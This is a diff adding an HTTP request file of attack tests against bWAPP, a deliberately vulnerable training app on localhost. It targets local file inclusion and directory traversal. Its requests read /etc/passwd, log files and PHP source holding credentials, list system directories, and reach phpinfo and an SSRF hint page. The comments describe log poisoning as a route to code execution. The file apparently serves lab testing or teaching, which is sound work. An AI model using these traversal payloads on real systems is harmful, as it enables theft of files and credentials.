@@ -1,0 +1,107 @@
+### ============================================================================
+### 03 - A5 Security Misconfiguration / A4 Insecure Design:
+###     Local File Inclusion, path traversal and source disclosure
+###
+###   directory_traversal_1.php?page=<file>  -> is_file() + fopen() + fgets()
+###   directory_traversal_2.php?directory=<d> -> raw directory listing
+###   Both are gated on $_COOKIE["security_level"] only, i.e. on a cookie the
+###   client chooses. See 08-info-disclosure.http INFO-09.
+### ============================================================================
+
+### ---------------------------------------------------------------------------
+### LFI-01  Read /etc/passwd by walking out of the webroot
+###   is_file() gets an absolute-ish path after enough ../ hops, and the loop
+###   echoes every line, so this is a full arbitrary file read primitive.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=../../../../../../../etc/passwd HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, "root:x:0:0:root:/root:/bin/bash" in the output
+
+
+### ---------------------------------------------------------------------------
+### LFI-02  Read any absolute path - /etc/hostname (container id)
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=/etc/hostname HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, the container hostname; NOT "This file doesn't exist!"
+
+
+### ---------------------------------------------------------------------------
+### LFI-03  Read the Apache access log (log poisoning -> RCE preimage)
+###   Proves the read primitive reaches paths you did not predict, and gives a
+###   foothold for the log-poisoning technique if this ever hit a real host.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=/var/log/apache2/access.log HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, HTTP request lines, or "This file doesn't exist!" if the
+###           image logs elsewhere - either result is useful recon.
+
+
+### ---------------------------------------------------------------------------
+### LFI-04  SOURCE CODE DISCLOSURE - read a PHP file as plain text
+###   The handler uses fopen()/fgets(), never include(). That means the raw
+###   source is returned instead of being executed - a .php extension does not
+###   protect anything here.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=config.inc.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, the literal text "<?php" and "$db_username" in the output
+
+
+### ---------------------------------------------------------------------------
+### LFI-05  SOURCE DISCLOSURE - the application's own credentials file
+###   admin/settings.php holds the DB user, the static login/password pair and
+###   the SMTP host in cleartext. This single request hands over the app's
+###   entire secret inventory.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_1.php?page=admin/settings.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, plaintext: $db_username = "root"; $login = "bee"; $password = "bug";
+
+
+### ---------------------------------------------------------------------------
+### LFI-06  Directory listing of an arbitrary absolute path
+###   directory_traversal_2.php renders the raw listing of <directory>.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_2.php?directory=/etc HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, an index of /etc including "passwd" and "shadow"
+
+
+### ---------------------------------------------------------------------------
+### LFI-07  Directory listing of the webroot itself
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/directory_traversal_2.php?directory=/var/www/html HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, full list of application files - complete source map in one request
+
+
+### ---------------------------------------------------------------------------
+### LFI-08  phpinfo() exposed to any authenticated user
+###   Leaks PHP version, loaded modules, include_path, all environment
+###   variables, and every $_ENV/$_SERVER key.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/phpinfo.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, ~80 KB of PHP configuration output
+
+
+### ---------------------------------------------------------------------------
+### LFI-09  RFI / SSRF entry point (informational)
+###   rlfi.php and ssrf.php are hint pages: bWAPP expects the attacker to chain
+###   Remote File Inclusion (or XXE) to make the SERVER issue the outbound
+###   request. The reachable, working version of that is in 04-xxe-mail-upload.http
+###   (XXE-02) - use this request as the map of what to attack.
+### ---------------------------------------------------------------------------
+GET {{baseUrl}}/ssrf.php HTTP/1.1
+Host: localhost:8080
+Cookie: {{authCookie}}
+### Expected: 200, describes the SSRF objective and points at the XXE payload files
